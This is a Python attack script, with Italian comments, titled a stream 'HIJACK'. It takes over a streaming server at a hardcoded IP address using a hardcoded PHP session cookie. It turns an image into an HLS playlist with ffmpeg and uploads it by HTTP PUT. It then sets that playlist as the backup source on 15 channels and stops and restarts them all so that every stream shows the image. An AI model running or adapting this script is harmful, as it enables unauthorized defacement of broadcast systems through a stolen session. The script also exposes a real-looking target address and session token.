#!/usr/bin/env python3
"""
🔥 PAT.PNG → f57.m3u8 HIJACK - VERSIONE CORRETTA
"""

import subprocess
import requests
import os
import time
import shutil
from pathlib import Path

TARGET = "http://185.22.183.148:8085"
COOKIE = {'PHPSESSID': 'rk9a4s6ub06m8l1fei8jrmop02'}
PNG_FILE = "pat.png"
HLS_DIR = "hls_f57"
M3U8_NAME = "f57.m3u8"
M3U8_URL = f"{TARGET}/media/hls_183_148/f57/{M3U8_NAME}"

print("🎥 PAT TAKEOVER v3.0 - FFmpeg FIXED!")

# 1️⃣ PNG → m3u8 CORRETTO (immagine singola)
def create_m3u8_fixed():
    print("🔄 [1/5] pat.png → f57.m3u8 (FIXED)...")
    
    # Pulisci
    shutil.rmtree(HLS_DIR, ignore_errors=True)
    Path(HLS_DIR).mkdir()
    
    # ✅ COMANDO FFmpeg CORRETTO per PNG singola
    cmd = [
        'ffmpeg', '-y',
        '-loop', '1',           # Loop immagine
        '-i', PNG_FILE,
        '-t', '300',            # 5 minuti (sufficiente)
        '-c:v', 'libx264',
        '-pix_fmt', 'yuv420p',
        '-r', '1',              # 1 fps (risparmia CPU)
        '-f', 'hls',
        '-hls_time', '10',
        '-hls_list_size', '0',
        '-hls_flags', 'delete_segments',
        f'{HLS_DIR}/{M3U8_NAME}'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print("❌ FFmpeg ERROR:", result.stderr)
        print("🔧 Prova manuale: ffmpeg -loop 1 -i pat.png -t 300 -c:v libx264 -pix_fmt yuv420p -r 1 -f hls hls_f57/f57.m3u8")
        return False
    
    # Verifica file creati
    if os.path.exists(f'{HLS_DIR}/{M3U8_NAME}'):
        print("✅ [1/5] f57.m3u8 OK!")
        return True
    return False

# 2️⃣ UPLOAD
def upload_m3u8():
    print("🔄 [2/5] UPLOAD → media/hls_183_148/f57/...")
    
    # Crea dir sul target
    requests.put(f"{TARGET}/media/hls_183_148/f57/", cookies=COOKIE, verify=False)
    
    # Upload m3u8
    with open(f'{HLS_DIR}/{M3U8_NAME}', 'rb') as f:
        r = requests.put(M3U8_URL, cookies=COOKIE, verify=False, data=f)
    
    # Upload primi TS segments
    for ts in Path(HLS_DIR).glob('*.ts')[:3]:
        with open(ts, 'rb') as f:
            requests.put(f"{TARGET}/media/hls_183_148/f57/{ts.name}", 
                        cookies=COOKIE, verify=False, data=f)
    
    print(f"✅ [2/5] UPLOAD {r.status_code}! URL: {M3U8_URL}")

# 3️⃣ BACKUP ALL
def set_backup_all():
    print("🔄 [3/5] BACKUP → 15 canali...")
    channels = [str(i) for i in range(1, 16)]
    for ch in channels:
        data = {ch: 'edit', 'backup_source': M3U8_URL, 'btn-save': 'Save'}
        requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
    print("✅ [3/5] Backup settato!")

# 4️⃣ FORCE FALLBACK
def force_fallback():
    print("🔄 [4/5] STOP → START tutti...")
    channels = [str(i) for i in range(1, 16)]
    
    # STOP
    for ch in channels:
        requests.post(f"{TARGET}/action.php", data={ch: 'stop'}, cookies=COOKIE, verify=False)
    time.sleep(3)
    
    # START = BACKUP!
    for ch in channels:
        requests.post(f"{TARGET}/action.php", data={ch: 'start'}, cookies=COOKIE, verify=False)
    print("✅ [4/5] Fallback attivo!")

# MAIN
if __name__ == "__main__":
    if not os.path.exists("pat.png"):
        print("❌ pat.png mancante!")
        exit(1)
    
    if create_m3u8_fixed():
        upload_m3u8()
        set_backup_all()
        force_fallback()
        print("\n🎉 PAT.PNG SU TUTTE LE STREAM! 🌍")
        print(f"Verifica: {TARGET}")
    else:
        print("\n🔧 DEBUG FFmpeg:")
        print("1. apt install ffmpeg")
        print("2. ls -la pat.png")
        print("3. file pat.png | grep PNG")
